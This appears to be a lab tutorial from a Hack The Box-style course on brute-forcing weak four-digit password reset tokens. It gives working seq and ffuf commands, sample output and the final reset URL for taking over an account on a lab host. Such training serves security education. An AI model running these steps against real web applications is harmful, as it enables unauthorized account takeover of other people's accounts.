# Brute-Forcing Password Reset Tokens

## Overview

Many web applications implement password recovery functionality when users forget their passwords. This typically relies on a one-time reset token sent via SMS or email. However, weak password-reset tokens can be brute-forced or predicted by attackers to gain unauthorized access.

## Identifying Weak Reset Tokens

Reset tokens are secret data generated when a user requests a password reset. They enable account takeover if implemented incorrectly.

A typical password reset flow includes:
- User requests password reset
- Application generates and sends token
- User presents token to verify identity
- Application grants login and forces new password

### Example of a Weak Token

Consider this password reset email:

```
Hello,

We have received a request to reset your password. Please follow the instructions below:

1. Click to reset: http://weak_reset.htb/reset_password.php?token=7351

This link expires in 24 hours.
```

The token `7351` is only a 4-digit number, allowing just 10,000 possible values. This makes brute-forcing feasible.

## Attacking Weak Reset Tokens

### Generate Token Wordlist

Use `seq` to create all possible tokens (0000-9999):

```shellsession
alexsdb@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

Verify the output:

```shellsession
alexsdb@htb[/htb]$ head tokens.txt
0000
0001
0002
...
```

### Brute-Force with ffuf

Send a password reset request for your target user, then brute-force the token:

```shellsession
alexsdb@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

If successful, you'll find valid tokens:

```
[Status: 200, Size: 2667, Words: 538, Lines: 90]
    * FUZZ: 6182
```

### Reset the Password

Access the reset page at:
```
http://<SERVER_IP>:<PORT>/reset_password.php?token=6182
```

This allows you to reset the account password and gain access.
